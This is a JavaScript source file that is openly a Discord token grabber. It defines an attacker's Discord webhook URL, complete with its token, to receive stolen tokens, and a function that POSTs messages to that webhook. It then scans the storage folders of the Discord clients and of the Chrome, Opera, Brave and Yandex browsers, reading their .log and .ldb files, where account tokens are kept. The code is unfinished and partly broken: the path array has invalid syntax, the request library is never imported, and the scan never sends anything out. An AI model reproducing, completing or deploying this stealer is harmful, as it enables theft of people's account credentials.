//import filereader
var fs = require('fs');


//Change the webhook to your own
var WEBHOOK_URL = "https://canary.discord.com/api/webhooks/904576272364097536/4DxHD9ZRKj71tAB0_Mk3lKT0iYwUkZuRRG9efb6bs33svGzw-taeIolqwxYPVW4LybEF";

//Set to true to ping @everyone when you get a new token
var PING_ME = false;



//Send webhook
function sendWebhook(webhook, message) {
    var options = {
        uri: webhook,
        method: 'POST',
        json: {
            content: message
        }
    };
    request(options, function (error, response, body) {
        if (!error && response.statusCode == 200) {
            console.log(body);
        }
    });
}

//Define local appdata folder
var local = process.env.LOCALAPPDATA;
var roaming = process.env.APPDATA;

//Create an array of paths
var paths = [
   'Discord' = roaming + "\\Discord",
   'Discord Canary' = roaming + "\\discordcanary",
   'Discord PTB' = roaming + "\\discordptb",
   'Google Chrome' = local + "\\Google\\Chrome\\User Data\\Default",
   'Opera' = roaming + "\\Opera Software\\Opera Stable",
   'Brave' = local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
   'Yandex' = local + "\\Yandex\\YandexBrowser\\User Data\\Default"
];

// Look through each path to find any files ending in .log or .ldb
for (var i = 0; i < paths.length; i++) {
    var path = paths[i];
    var files = fs.readdirSync(path);
    for (var j = 0; j < files.length; j++) {
        var file = files[j];
        if (file.endsWith(".log") || file.endsWith(".ldb")) {
            var filePath = path + "\\" + file;
            var fileContents = fs.readFileSync(filePath, "utf8");
            var lines = fileContents.split("\n");
            console.log(filePath);
        }
    }
}